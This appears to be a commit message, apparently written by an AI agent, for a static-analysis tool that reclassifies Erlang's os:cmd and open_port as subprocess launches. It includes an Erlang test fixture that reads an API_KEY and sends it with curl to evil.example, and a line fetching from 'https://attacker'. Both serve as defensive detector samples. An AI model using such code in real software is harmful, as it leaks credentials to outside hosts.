@@ -1,0 +1,87 @@
+Original commit body from b6fbb2bcdbe92c69d1ba97d0099189b2a44b9158:
+
+WI-jupaf. erlang.yaml was the only one of the fourteen shipped catalogues with
+no `subprocess:` section at all, and `cmd` sat in the os module's env_read AND
+env_write lists beside getenv/putenv -- swept along with the rest of the module.
+`erlang:open_port/2`, the primitive os:cmd/1 is built on, was catalogued
+nowhere.
+
+A FALSE CONFIRM, NOT A RECALL MISS, and that distinction is the point. The call
+was never invisible; it was CLASSIFIED, as env_read, and since INV-buzab a
+classified call is what `examined` means. So the exfiltration counted as an
+EXAMINED NEGATIVE for the boundary that was actually true, with
+high_risk: false. Measured on the shipped CLI:
+
+    -module(leak).
+    handler() ->
+        Secret = os:getenv("API_KEY"),
+        os:cmd("curl -d " ++ Secret ++ " https://evil.example/p").
+
+    claim {boundary: subprocess, must_not_exist: true}
+      BEFORE  confirmed rc 0   "No subprocess chains found."
+      AFTER   violated  rc 1   1 subprocess chain
+
+    same fixture also calling erlang:open_port
+      BEFORE  inconclusive rc 2      AFTER  violated rc 1  (2 chains)
+
+    NON-DESTRUCTION, {boundary: env_read, must_not_exist: true}
+      BEFORE  violated rc 1          AFTER  violated rc 1
+
+The boundary map splits cleanly and loses nothing:
+env_read {os.getenv: 1} / subprocess {os.cmd: 1} high_risk=true /
+total_io_edges unchanged at 2.
+
+A CONFOUND ATE THE FIRST MEASUREMENT AND IT FLATTERED THE TOOL, so it is
+recorded: the first fixture ALSO called erlang:open_port and returned
+`inconclusive` rc 2 -- not because the launch was detected, but because
+`erlang` is itself an uncatalogued module and tripped the coverage gate.
+Removing open_port isolates os:cmd and the verdict is a clean false confirm.
+
+EMISSION SHAPE MEASURED FIRST, as the item demanded, because rows the analyzer
+can never match are a ceiling rather than a payoff -- INV-linub's L2-only fix
+measured as a win at the analyzer and produced zero new findings. The Erlang
+analyzer emits `erlang:os:0-0:cmd:external_symbol` with
+call_construct='remote_external', and the POSITIVE CONTROL is that the existing
+WRONG row already matched it end to end, producing an env_read chain. The key
+resolved; only the boundary was wrong.
+
+ONE CATALOGUE, NOT TWO -- correcting this item's own filed contrast. It says
+elixir "shares the BEAM and gets it right". True of System.cmd, FALSE of
+os.cmd: a census measured elixir resolving os.cmd to env_read identically,
+because ELIXIR INHERITS ERLANG (the child-over-parent mechanism scala uses for
+java). Elixir's own subprocess: section for System.cmd/Port.open is what made
+the family look covered. The fix lands once here, and a parity test asserts the
+INHERITED answer so a future edit that fixes only the child leaves the parent's
+defect visible.
+
+RE-KEYED, NOT SUPPLEMENTED. `cmd` is REMOVED from the env lists rather than
+also declared under subprocess, because INV-zumin measured what a
+multi-boundary primitive does: lookup_with_module returns one row decided by
+YAML ROW ORDER, so the correct declaration would have been live or inert
+depending on where it was pasted. A test pins that os.cmd resolves to
+{subprocess} alone.
+
+os.cmd and erlang.open_port also join HIGH_RISK_PRIMITIVES. The existing
+subprocess drift guard (TestHighRiskPrimitivesDriftGuard) fires otherwise --
+it caught this in the red-to-green cycle -- and losing the boundary had lost
+the *** HIGH RISK *** marking too, so re-keying alone would have fixed the
+chain and left the warning missing.
+
+TAINT-ARM DIRECTION, MEASURED NOT ASSUMED. io_primitives auto-derives taint
+entries by boundary (WI-lokuv), so the re-key changes the primitive's ROLE:
+env_read derives a SOURCE, subprocess derives a SINK. Verified on the merged
+catalogue for both languages -- os.cmd is now a sink in zone `subprocess`
+(a command going OUT) where it was a source labelled host_secret (data coming
+IN), which is exactly the mis-modelling the item named.
+
+AND THE HALF THAT REMOVAL LEAVES OPEN, filed rather than left to be
+discovered (WI-rinal): the source is now ABSENT, and the output of a launched
+program is genuinely untrusted input. `Data = os:cmd("curl https://attacker")`
+returns attacker-controlled bytes that nothing labels. The OLD source was still
+wrong -- env_read maps to host_secret, so the tool was minting a "secret" from
+the stdout of `os:cmd("ls")` -- so this is a recall gap the change CREATES, not
+a regression it causes, and it generalises past the BEAM to every subprocess
+primitive that returns the child's output.
+
+Ref: WI-jupaf, WI-rinal (filed), INV-zumin (row-order hazard avoided).
+Signed-off-by: jgstern-agent <josh-agent@iterabloom.com>
